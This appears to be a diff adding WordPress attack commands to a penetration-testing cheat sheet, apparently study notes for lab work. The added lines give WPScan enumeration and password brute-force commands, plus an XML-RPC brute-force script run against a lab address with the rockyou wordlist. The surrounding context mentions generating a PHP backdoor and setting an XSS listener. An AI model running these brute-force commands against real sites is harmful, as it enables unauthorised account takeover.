@@ -72,6 +72,14 @@ Generate a PHP backdoor (generate) protected with the given password (s3cr3t)
 -------------------- Wordpress --------------------
 WordPress Scan - Wordpress security scanner
      # wpscan --url $ip/blog --proxy $ip:3129
+     # wpscan --url http://<IP ADDRESS>/wp/ -e vt,tt,u,ap --log wp.log
+WPScan brute force known user account.
+     # wpscan -u <IP ADDRESS> --wordlist <wordlist>.txt --username <UserName>
+
+xmlrpc.php
+https://null-byte.wonderhowto.com/how-to/gain-control-wordpress-by-exploiting-xml-rpc-0174864/
+
+/wordpress-xmlrpc-brute-v2.py http://10.11.1.251/wp/xmlrpc.php /usr/share/wordlists/rockyou.txt admin
 
 -------------------- XSS --------------------
 On attacker machine set listener 
